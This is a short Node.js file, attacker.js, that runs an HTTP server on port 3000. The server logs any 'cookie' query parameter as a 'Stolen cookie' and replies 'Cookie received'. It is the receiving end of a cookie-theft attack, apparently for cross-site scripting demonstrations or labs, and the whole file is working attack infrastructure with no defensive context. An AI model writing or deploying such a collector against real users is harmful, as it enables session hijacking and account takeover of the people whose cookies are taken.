// attacker.js
const http = require('http');
const url = require('url');

http.createServer((req, res) => {
    const queryObject = url.parse(req.url, true).query;
    console.log("🔥 Stolen cookie:", queryObject.cookie);
    res.end('Cookie received');
}).listen(3000, () => {
    console.log('Attacker server listening on port 3000');
});